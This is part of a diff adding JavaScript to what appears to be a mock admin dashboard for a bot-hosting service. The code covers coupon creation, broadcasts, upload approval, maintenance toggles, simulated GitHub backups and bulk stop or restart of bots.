+          void formBox.offsetWidth; // trigger reflow
+          formBox.classList.add("animate-shake");
+        }
+        showToast("Invalid Admin Key! Access Denied.", "danger");
+      }
+    }
+
+    function lockAdminPanel() {
+      state.adminAuthenticated = false;
+      addAudit("admin_logout", "panel_locked=true");
+      showToast("🔒 Admin Panel Locked.", "info");
+      refreshUI();
+    }
+
+    function createAdminCoupon() {
+      const codeEl = document.getElementById("adminCouponCode");
+      const amtEl = document.getElementById("adminCouponAmt");
+      const code = (codeEl.value || "").trim().toUpperCase();
+      const amt = parseInt(amtEl.value || "0", 10);
+      if (!code || amt <= 0) {
+        showToast("Enter valid coupon code and amount", "warn");
+        return;
+      }
+      state.coupons[code] = amt;
+      codeEl.value = "";
+      addAudit("coupon_add", `code=${code} credit=${amt}৳`);
+      showToast(`Created coupon ${code} (+${amt} ৳)`, "success");
+    }
+
+    function sendAdminBroadcast() {
+      const input = document.getElementById("adminBroadcastInput");
+      const msg = (input.value || "").trim();
+      if (!msg) {
+        showToast("Enter a broadcast message first", "warn");
+        return;
+      }
+      input.value = "";
+      addAudit("broadcast", `msg="${msg.slice(0, 40)}" sent=all`);
+      showToast(`📢 Broadcast delivered to all active users: "${msg}"`, "success");
+    }
+
+    function renderAdminPanel() {
+      const box = document.getElementById("adminPendingContainer");
+      document.getElementById("pendingCountLabel").textContent = `${state.pendingUploads.length} waiting`;
+
+      if (!state.pendingUploads.length) {
+        box.innerHTML = `<div class="p-6 rounded-xl bg-slate-950 border border-slate-800 text-center text-xs text-slate-500">Inbox is empty — no uploads waiting for approval.</div>`;
+      } else {
+        box.innerHTML = state.pendingUploads.map(item => `
+          <div class="p-3.5 rounded-xl bg-slate-950 border border-slate-800 flex flex-wrap items-center justify-between gap-3">
+            <div>
+              <div class="flex items-center gap-2">
+                <span class="font-mono font-bold text-sm text-white">${item.name}</span>
+                <span class="text-[10px] font-mono px-2 py-0.5 rounded ${item.verdict === 'SAFE' ? 'bg-emerald-500/15 text-emerald-300' : 'bg-amber-500/15 text-amber-300'}">
+                  ${item.verdict} (${item.risk}/100)
+                </span>
+              </div>
+              <p class="text-xs text-slate-400 mt-0.5">From: ${item.user} • File: <code>${item.file}</code> (${item.size})</p>
+            </div>
+            <div class="flex gap-2">
+              <button onclick="adminDecideUpload('${item.id}', true)" class="px-3 py-1.5 rounded-lg bg-emerald-600/20 hover:bg-emerald-600/30 text-emerald-300 border border-emerald-500/30 text-xs font-semibold">
+                <i class="fa-solid fa-check mr-1"></i> Approve
+              </button>
+              <button onclick="adminDecideUpload('${item.id}', false)" class="px-3 py-1.5 rounded-lg bg-rose-600/20 hover:bg-rose-600/30 text-rose-300 border border-rose-500/30 text-xs font-semibold">
+                <i class="fa-solid fa-xmark mr-1"></i> Reject
+              </button>
+            </div>
+          </div>
+        `).join("");
+      }
+
+      const auditEl = document.getElementById("adminAuditList");
+      auditEl.innerHTML = state.auditLogs.map(l => `<div class="py-1 border-b border-slate-900">${l}</div>`).join("");
+    }
+
+    function adminDecideUpload(id, approve) {
+      const idx = state.pendingUploads.findIndex(x => x.id === id);
+      if (idx === -1) return;
+      const item = state.pendingUploads.splice(idx, 1)[0];
+      if (approve) {
+        state.bots.push({
+          id: item.id,
+          name: item.name,
+          kind: "python",
+          entry: "bot.py",
+          status: "running",
+          pid: Math.floor(22000 + Math.random() * 5000),
+          cpu: 1.9,
+          memMb: 62.0,
+          sizeKb: 148,
+          uptimeSec: 1,
+          tunnelUrl: "",
+          tunnelPort: 8000,
+          env: {},
+          logs: [`════════════════ APPROVED & STARTED BY ADMIN ════════════════`]
+        });
+        addAudit("approve_bot", `bot=${item.name}`);
+        showToast(`Approved & started ${item.name}`, "success");
+      } else {
+        addAudit("reject_bot", `bot=${item.name}`);
+        showToast(`Rejected & wiped ${item.name}`, "danger");
+      }
+      refreshUI();
+    }
+
+    function toggleApprovalGate() {
+      state.approvalRequired = !state.approvalRequired;
+      const btn = document.getElementById("adminApprovalBtn");
+      btn.innerHTML = `<i class="fa-solid fa-check-double mr-1"></i> Approval Mode: ${state.approvalRequired ? 'ON' : 'OFF'}`;
+      addAudit("approval_toggle", `now=${state.approvalRequired}`);
+      showToast(`Approval Mode turned ${state.approvalRequired ? 'ON' : 'OFF'}`, "info");
+    }
+
+    function toggleMaintenanceMode() {
+      state.maintenanceMode = !state.maintenanceMode;
+      const btn = document.getElementById("adminMaintBtn");
+      btn.innerHTML = `<i class="fa-solid fa-screwdriver-wrench mr-1"></i> Maintenance: ${state.maintenanceMode ? 'ON' : 'OFF'}`;
+      addAudit("maintenance_toggle", `now=${state.maintenanceMode}`);
+      showToast(`Maintenance mode ${state.maintenanceMode ? 'ENABLED' : 'DISABLED'}`, "warn");
+    }
+
+    function triggerGitHubBackup() {
+      document.getElementById("ghLastBackupTime").textContent = "Uploading tarball...";
+      setTimeout(() => {
+        document.getElementById("ghLastBackupTime").textContent = new Date().toISOString().slice(11, 19) + " UTC (2.4 MB)";
+        addAudit("gh_backup_now", "backups/latest.tar.gz ok");
+        showToast("Synced encrypted storage & user_data.json to GitHub!", "success");
+      }, 800);
+    }
+
+    function adminMassAction(kind) {
+      if (kind === "stop") {
+        state.bots.forEach(b => { b.status = "stopped"; b.cpu = 0; b.memMb = 0; b.pid = null; });
+        addAudit("stop_all_bots", `count=${state.bots.length}`);
+        showToast("Stopped all running bots", "danger");
+      } else {
+        state.bots.forEach(b => {
+          b.status = "running";
+          b.pid = Math.floor(20000 + Math.random() * 9000);
+          b.cpu = +(2 + Math.random() * 3).toFixed(1);
+          b.memMb = +(60 + Math.random() * 50).toFixed(1);
+        });
+        addAudit("restart_all_bots", `count=${state.bots.length}`);
+        showToast("Restarted all bots cleanly", "success");
+      }
+      refreshUI();
+    }
+
+    // Initialize on load
+    window.addEventListener("DOMContentLoaded", () => {
+      loadScannerPreset("clean");
+      switchTab("dashboard");
+    });
+  </script>
 </body>
 </html>
